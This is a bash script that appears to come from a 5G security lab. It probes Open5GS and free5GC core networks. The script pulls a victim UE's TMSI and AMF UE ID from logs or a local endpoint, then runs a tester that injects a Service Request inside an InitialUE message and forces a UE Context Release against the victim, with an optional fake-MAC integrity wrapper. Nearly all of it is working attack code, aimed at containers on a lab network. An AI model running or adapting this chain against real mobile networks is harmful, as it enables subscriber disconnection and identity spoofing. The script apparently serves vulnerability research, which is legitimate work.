#!/usr/bin/env bash
# Probe: full plain Service Request NAS inside InitialUE → look for DL + cause.
# Pairs with verify_chain_initue_then_release.sh and docs/RESULTS_{open5gs,free5gc}.md
#   Open5GS: expect ServiceReject (0x09) + learn new AU + Release(learned) Command
#   free5GC: expect wrong sec-hdr / no DL (try NAS_INTEGRITY=1)
# Usage: bash pcap/run_full_sr_probe.sh [free5gc|open5gs]
#        NAS_INTEGRITY=1 bash pcap/run_full_sr_probe.sh free5gc
set -uo pipefail
cd "$(dirname "$0")/.."
CORE="${1:-open5gs}"
export MSYS_NO_PATHCONV=1

case "$CORE" in
  free5gc)
    AMF=f5gc-amf; UE=ueransim-free5gc-ueransim-ue-1; CFG=free5gc
    ;;
  open5gs)
    AMF=o5gs-amf; UE=ueransim-open5gs-ueransim-ue-1; CFG=open5gs
    ;;
  *) echo "usage: $0 [free5gc|open5gs]"; exit 1;;
esac

OUT="pcap/probe_full_sr_${CORE}"
mkdir -p "$OUT"
ABS="$(pwd)/$OUT"

INTEGRITY="${NAS_INTEGRITY:-0}"   # set NAS_INTEGRITY=1 for fake-MAC wrapper

echo "=== restart UE ==="
docker restart "$UE" >/dev/null
sleep 14

if [ "$CORE" = "free5gc" ]; then
  GUTI=$(docker logs "$AMF" 2>&1 | grep -oE 'guti:[0-9a-f]+' | tail -1 | sed 's/guti://')
  AU=$(docker logs "$AMF" 2>&1 | grep -oE 'AU:[0-9]+' | tail -1 | grep -oE '[0-9]+')
  AMFID=${GUTI:5:6}; TMSI=${GUTI:11:8}
  AMFID_INT=$((16#$AMFID))
  SET=$(( (AMFID_INT >> 6) & 0x3FF ))
  PTR=$(( AMFID_INT & 0x3F ))
else
  INFO=$(docker run --rm --network net-5glab curlimages/curl -s "http://172.30.0.10:9091/ue-info")
  echo "$INFO" | head -c 400; echo
  AU=$(echo "$INFO" | sed -n 's/.*"amf_ue_ngap_id":\([0-9]*\).*/\1/p' | head -1)
  TMSI_DEC=$(echo "$INFO" | sed -n 's/.*"m_tmsi":\([0-9]*\).*/\1/p' | head -1)
  TMSI=$(printf '%08x' "$TMSI_DEC")
  SET=1; PTR=0
fi
echo "victim AU=$AU TMSI=$TMSI set=$SET ptr=$PTR"

EXTRA=()
[ "$INTEGRITY" = "1" ] && EXTRA+=(--nas-integrity)

MARK=$(docker logs "$AMF" 2>&1 | wc -l | tr -d ' ')
docker run --rm --network net-5glab -v "$ABS:/evidence" ngap-tester \
  --config "config/$CFG.json" --evidence /evidence/attack.jsonl \
  chain-initue-release \
    --ran-ue-id 99 \
    --amf-set-id "$SET" --amf-pointer "$PTR" --tmsi "$TMSI" \
    --victim-amf-ue-id "$AU" --release-target both \
    --initue-listen 5 --release-wait 5 \
    "${EXTRA[@]}"

echo "=== AMF markers ==="
docker logs "$AMF" 2>&1 | tail -n +$((MARK + 1)) \
  | grep -iE 'InitialUE|Service|Reject|cause|Holding|NAS|Error|Release|AU:|AMF_UE' \
  | tail -40
echo "=== evidence ==="
cat "$OUT/attack.jsonl" 2>/dev/null || true
